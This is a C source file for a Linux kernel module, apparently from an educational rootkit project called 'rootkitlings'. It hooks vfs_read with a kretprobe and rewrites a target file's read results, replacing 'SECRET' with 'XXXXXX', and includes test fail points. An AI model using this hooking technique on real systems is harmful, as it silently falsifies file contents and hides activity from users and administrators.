// SPDX-License-Identifier: GPL-2.0
#include <linux/atomic.h>
#include <linux/compiler.h>
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#include "replace.h"
#include "rootkit.h"

#define RK_FROM "SECRET"
#define RK_TO "XXXXXX"
#define RK_FROM_WIDTH (sizeof(RK_FROM) - 1)
#define RK_TO_WIDTH (sizeof(RK_TO) - 1)
#define RK_MISSING_TARGET "__rootkitlings_missing_kretprobe_target_7_2__"

static_assert(RK_FROM_WIDTH == RK_TO_WIDTH);

struct rk_read_instance {
	char __user *buffer;
	unsigned char scratch[RK_READ_RESULT_LIMIT];
};

static struct inode *selected_inode;
static atomic_long_t redactions = ATOMIC_LONG_INIT(0);
static atomic_long_t oversize_results = ATOMIC_LONG_INIT(0);
static atomic_long_t copy_failures = ATOMIC_LONG_INIT(0);

static int rk_read_entry(struct kretprobe_instance *instance,
			 struct pt_regs *registers)
{
	struct rk_read_instance *read = (void *)instance->data;
	struct file *file;

	read->buffer = NULL;
	file = (struct file *)regs_get_kernel_argument(registers, 0);
	if (!file || file_inode(file) != READ_ONCE(selected_inode))
		return 1;

	read->buffer = (char __user *)regs_get_kernel_argument(registers, 1);
	if (!read->buffer)
		return 1;
	return 0;
}

static int rk_read_return(struct kretprobe_instance *instance,
			  struct pt_regs *registers)
{
	struct rk_read_instance *read = (void *)instance->data;
	const long result = (long)regs_return_value(registers);
	size_t count;

	if (result <= 0)
		return 0;
	if (result > RK_READ_RESULT_LIMIT) {
		atomic_long_inc(&oversize_results);
		return 0;
	}

	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_COPY_FROM_USER ||
	    copy_from_user_nofault(read->scratch, read->buffer, result) != 0) {
		atomic_long_inc(&copy_failures);
		regs_set_return_value(registers, -EFAULT);
		return 0;
	}

	count = rk_replace_equal(read->scratch, result,
				 (const unsigned char *)RK_FROM,
				 (const unsigned char *)RK_TO,
				 RK_FROM_WIDTH);
	if (count == 0)
		return 0;

	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_COPY_TO_USER ||
	    copy_to_user_nofault(read->buffer, read->scratch, result) != 0) {
		atomic_long_inc(&copy_failures);
		regs_set_return_value(registers, -EFAULT);
		return 0;
	}

	atomic_long_add(count, &redactions);
	return 0;
}

static struct kretprobe read_probe = {
#if ROOTKITLINGS_FAIL_POINT == RK_FAIL_KRETPROBE_TARGET
	.kp.symbol_name = RK_MISSING_TARGET,
#else
	.kp.symbol_name = "vfs_read",
#endif
	.entry_handler = rk_read_entry,
	.handler = rk_read_return,
	.data_size = sizeof(struct rk_read_instance),
	.maxactive = RK_READ_RETURN_CAPACITY,
};

__must_check int rk_read_target_retain(void)
{
	struct file *file;
	struct inode *inode;

	if (selected_inode)
		return -EBUSY;

	file = filp_open(RK_READ_TARGET, O_RDONLY, 0);
	if (IS_ERR(file))
		return PTR_ERR(file);
	inode = igrab(file_inode(file));
	fput(file);
	if (!inode)
		return -ENOENT;

	atomic_long_set(&redactions, 0);
	atomic_long_set(&oversize_results, 0);
	atomic_long_set(&copy_failures, 0);
	WRITE_ONCE(selected_inode, inode);
	return 0;
}

void rk_read_target_release(void)
{
	struct inode *inode = READ_ONCE(selected_inode);

	WRITE_ONCE(selected_inode, NULL);
	if (inode)
		iput(inode);
}

__must_check int rk_read_filter_start(void)
{
	if (!READ_ONCE(selected_inode))
		return -EINVAL;
	return register_kretprobe(&read_probe);
}

void rk_read_filter_stop(void)
{
	unregister_kretprobe(&read_probe);
}

unsigned long rk_read_redactions(void)
{
	return atomic_long_read(&redactions);
}

unsigned long rk_read_oversize_results(void)
{
	return atomic_long_read(&oversize_results);
}

unsigned long rk_read_copy_failures(void)
{
	return atomic_long_read(&copy_failures);
}

unsigned int rk_read_return_capacity(void)
{
	return (unsigned int)READ_ONCE(read_probe.maxactive);
}

unsigned int rk_read_returns_missed(void)
{
	return (unsigned int)READ_ONCE(read_probe.nmissed);
}
